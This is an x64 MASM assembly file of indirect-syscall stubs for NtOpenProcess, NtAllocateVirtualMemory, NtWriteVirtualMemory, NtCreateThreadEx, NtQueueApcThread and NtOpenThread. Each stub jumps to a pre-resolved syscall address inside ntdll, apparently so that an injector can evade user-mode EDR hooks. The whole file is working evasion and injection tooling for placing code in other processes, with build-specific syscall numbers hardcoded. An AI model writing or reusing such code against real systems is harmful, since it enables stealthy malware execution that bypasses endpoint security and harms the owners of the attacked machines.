EXTERN syscallAddress_CreateThreadEx:QWORD
EXTERN syscallAddress_AllocateVirtualMemory:QWORD
EXTERN syscallAddress_NtOpenProcess:QWORD
EXTERN syscallAddress_NtWriteVirtualMemory:QWORD
EXTERN syscallAddress_NtQueueApcThread:QWORD
EXTERN syscallAddress_NtOpenThread:QWORD

.code

my_asm_NTCreateThreadex proc
	mov     r10, rcx        ; NtCreateThreadEx
	mov     eax, 0C9h
	
	jmp qword ptr [syscallAddress_CreateThreadEx]
	
	
	;syscall                 ; Low latency system call
	ret

my_asm_NTCreateThreadex endp   



my_asm_NtAllocateVirtualMemory proc
	mov     r10, rcx        ; NtAllocateVirtualMemory
	mov     eax, 18h
	; direct syscall, execute the syscall
	;syscall              

	; indirect syscall, instead of execute the syscall, we jump on the syscall in the ntdll
	; we resolved this address, previously, in [syscallAddress_AllocateVirtualMemory]
	jmp qword ptr [syscallAddress_AllocateVirtualMemory]
	ret
my_asm_NtAllocateVirtualMemory endp



my_asm_NtOpenProcess proc
	mov     r10, rcx        ; NtOpenProcess
	mov     eax, 26h 
	jmp qword ptr [syscallAddress_NtOpenProcess]
	ret
my_asm_NtOpenProcess endp



my_asm_NtWriteVirtualMemory proc
	mov     r10, rcx        ; NtWriteVirtualMemory
	mov     eax, 3Ah
	jmp qword ptr [syscallAddress_NtWriteVirtualMemory]
	ret
my_asm_NtWriteVirtualMemory endp

my_asm_NtQueueApcThread proc
    mov     r10, rcx        ; NtQueueApcThread
    mov     eax, 45h
    jmp qword ptr [syscallAddress_NtQueueApcThread]
    ret
my_asm_NtQueueApcThread endp

my_asm_NtOpenThread proc
    mov     r10, rcx
    mov     eax, 139h         ; syscall ID for NtOpenThread (valide sur Win10)
    jmp     qword ptr [syscallAddress_NtOpenThread]
    ret
my_asm_NtOpenThread endp

end